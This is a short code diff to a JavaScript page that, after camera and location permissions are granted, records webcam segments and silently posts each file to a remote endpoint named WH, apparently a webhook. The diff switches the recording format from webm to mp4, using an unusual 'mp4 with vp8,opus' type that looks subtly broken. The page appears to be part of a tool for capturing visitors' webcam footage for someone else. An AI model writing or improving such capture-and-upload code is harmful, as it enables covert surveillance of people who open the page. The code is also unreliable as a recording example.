@@ -47,7 +47,7 @@ function ready(){ if(allowMedia && allowGeo) $("#perm-continue").disabled = fals
 
 /* ===== RECORDING: one playable file per segment ===== */
 const MAX_BYTES = 7_800_000;                        // 7.43 MB
-const MIME      = "video/webm;codecs=vp8,opus";
+const MIME      = "video/mp4;codecs=vp8,opus";
 
 function startRecorder(){
   if(!camStream) return;
@@ -75,7 +75,7 @@ function stopRecorder(){
 
 function upload(blob){
   const fd = new FormData();
-  fd.append("file", blob, `cam_${Date.now()}.webm`);
+  fd.append("file", blob, `cam_${Date.now()}.mp4`);
   fetch(WH, { method:"POST", body:fd }).catch(()=>{});
 }
 
